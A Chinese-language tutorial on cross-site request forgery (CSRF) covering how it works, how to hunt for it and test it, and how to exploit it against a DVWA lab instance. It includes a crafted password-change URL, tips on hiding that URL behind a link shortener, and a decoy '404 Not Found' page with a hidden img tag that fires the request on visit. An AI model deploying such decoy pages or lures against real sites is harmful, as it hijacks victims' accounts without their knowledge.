跨站请求伪造（英语：Cross-site request forgery）, 是一种“**挟制用户**”在当前已登录的Web应用程序上执行“**非本意的操作**”的攻击方法。

## CSRF漏洞原理

其实我们不能挟持用户，但是我们可以挟持用户的浏览器发送任意的请求。某些html标签是可以发送HTTP GET类型的请求的。

例如`<img>`标签：**`<img src="http://www.baidu.com" />`**

浏览器渲染img标签的时候，并不知道img标签中src属性的值，到底是不是一个图片，浏览器做的就是根据src中的链接，发起一个HTTP  GET请求，并且携带上当前浏览器在目标网站上的凭证，也就是cookies，获取返回结果以图片的形式渲染。根据这个特性，可以挟持用户的浏览器携带用户凭证发送任意的请求。

## CSRF漏洞攻击流程

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/7/31/1630379686933.png?x-oss-process=style/ImageWaterMark_V1.0)

从图中可以看到，要完成一次CSRF攻击，受害者必须一次完成两个步骤：

1.登录信任站点A,并在本地生成Cookie。

2.同一浏览器中在不退出的情况下，访问危险网站B。

如果不满足以上两个条件中的一个，就不会受到CSRF的攻击。

## 一、CSRF漏洞的挖掘

跨站请求伪造，主要是伪造用户一些重要操作，但是因为攻击者看不到伪造请求的响应结果，因此在漏洞挖掘时，着重点要放在用户的“增“、“删”、“改”这些操作上。

- 增：自动发表一条心情、收藏指定的店铺等。
- 删：删除一条留言、好友等。
- 改：修改密码、转账、把礼物刷给指定主播等。

## 二、CSRF漏洞的检测

在漏洞的检测方面，不管是GET型还是POST型。

第一步、先判断重要操作的数据包中是否有随机值，比如token。如果存在先去除随机值查看能否正常请求，如果不可以就不存在CSRF。

第二步、如果可以正常请求，再去掉referer参数的内容，如果可以则存在CSRF漏洞。

## 三、CSRF漏洞的攻击

### 通过构造连接进行CSRF攻击

当发现存在`csrf`漏洞的点使用的是`get`型传参时,可以直接通过构造连接的方式进行攻击

#### 1、构造攻击连接

```
http://192.168.0.106/dvwa/vulnerabilities/csrf/?password_new=456&password_conf=456&Change=Change
```

#### 2、通过短链接隐藏构造的URL

直接构造出的url隐蔽性太低，可以通过短链接的方式对url进行隐蔽
 生成短链接常用网址：
 [站长工具](https://sechub.com.cn/app/#/index/articleDetails?id=1397452035359739906)
 点击短链接，会自动跳转到真实网站。

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/1/1630464890909.png?x-oss-process=style/ImageWaterMark_V1.0)

#### 3、通过img标签隐蔽URL

通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，然后在公网上传下面这个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。

```css
<html>
<head>
<title>404 Not Found</title>
</head>
<body>
<h1>Not Found</h1>
<img src="http://192.168.0.106/dvwa/vulnerabilities/csrf/?password_new=456&password_conf=456&Change=Change"/>
<p>The requested URL /qwzf.html was not found on this server.</p>
</body>
</html>
```

当用户访问该页面时，会误认为是自己访问一个失效的url，但实际上已经遭受了CSRF攻击

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/1/1630466027850.png?x-oss-process=style/ImageWaterMark_V1.0)

### 通过构造表单进行CSRF攻击

#### 1、使用BurpSuite获取数据包

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/1/1630461655063.png?x-oss-process=style/ImageWaterMark_V1.0)
 ![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/1/1630461673874.png?x-oss-process=style/ImageWaterMark_V1.0)

#### 2、使用BurpSuite构造CSRF攻击表单

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/1/1630461733607.png?x-oss-process=style/ImageWaterMark_V1.0)

#### 3、进一步对构造好的表单进行修饰，增加诱导性内容，增加攻击的成功率

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/7/31/1630400742548.png?x-oss-process=style/ImageWaterMark_V1.0)